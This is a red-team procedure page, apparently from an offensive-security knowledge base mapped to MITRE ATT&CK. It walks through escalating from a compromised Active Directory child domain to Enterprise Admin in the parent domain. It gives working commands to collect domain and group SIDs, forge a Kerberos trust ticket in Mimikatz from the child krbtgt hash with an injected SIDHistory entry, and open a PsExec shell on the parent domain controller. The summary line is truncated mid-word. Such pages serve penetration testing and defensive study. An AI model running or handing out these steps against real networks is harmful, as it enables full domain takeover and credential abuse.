---
id: e18f8d24-bb6e-4b44-8ecc-e0157b603d16
name: Forge an Internal Forest Trust Ticket and Escalate to DA in Parent (SIDHistory)
type: procedure
verified: true
submitted: true
created_at: '2020-07-20T22:27:56.351948+00:00'
updated_at: '2023-05-25T19:48:24.394453+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Access Token Manipulation|T1134 - Access Token Manipulation]]'
platforms:
- Windows
tags:
- '[[Active Directory]]'
commands:
- '[[Mimikatz Forge an Internal AD Forest Trust Ticket]]'
- '[[PsExec Spawn a PowerShell Prompt as SYSTEM]]'
- '[[whoami Display the Current User''s SID]]'
- '[[wmic Get a Group''s SID from Active Directory]]'
---

# Forge an Internal Forest Trust Ticket and Escalate to DA in Parent (SIDHistory)

**Status**: ✓ Verified

## Summary

Use the krbtgt NTLM hash of a compromised child domain to forge a Kerberos Trust Ticket. Using SIDHistory, attackers can add the SID of privileged groups in the parent domain, and therefore impersonate them and gain full domain administrator access. This attack will not work if the parent domain ha

## Description

# Description

Use the krbtgt NTLM hash of a compromised child domain to forge a Kerberos Trust Ticket. Using SIDHistory, attackers can add the SID of privileged groups in the parent domain, and therefore impersonate them and gain full domain administrator access. This attack will not work if the parent domain has SID filtering enabled (disabled by default).



# Instructions

1. Get the SID of the current (child) domain.





**Command** ([[whoami Display the Current User's SID]]):

```bash
whoami.exe /name
```



Note: This returns the current domain user's SID. The domain SID is the same as the user SID, with the last set of numbers removed. For example:
User SID:        **S-1-5-21-1576920733-1301476157-954876328**-1108
Domain SID:  **S-1-5-21-1576920733-1301476157-954876328**



2. Get the SID of a privileged group in the parent domain. A common target is the "Enterprise Admins" group.





**Command** ([[wmic Get a Group's SID from Active Directory]]):

```bash
wmic.exe group where name="$_TARGET_GROUP" get name,sid,domain
```





3. Use Mimikatz to forge the Internal AD Forest Trust Ticket.





**Command** ([[Mimikatz Forge an Internal AD Forest Trust Ticket]]):

```bash
mimikatz.exe "kerberos::golden /domain:$_CHILD_DOMAIN /sid:$_CHILD_DOMAIN_SID /sids:$_ENTERPRISE_ADMIN_SID /user:Administrator /krbtgt:$_KRBTGT_NTLM /ptt" "exit"
```





4. Use a tool such as PsExec to connect to the parent DC using the Internal AD Forest Trust Ticket.





**Command** ([[PsExec Spawn a PowerShell Prompt as SYSTEM]]):

```powershell
PsExec.exe -accepteula \\$_TARGET powershell.exe
```





## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Access Token Manipulation|T1134 - Access Token Manipulation]]

## Commands Used

- [[Mimikatz Forge an Internal AD Forest Trust Ticket]]
- [[PsExec Spawn a PowerShell Prompt as SYSTEM]]
- [[whoami Display the Current User's SID]]
- [[wmic Get a Group's SID from Active Directory]]

## Tags

- [[Active Directory]]


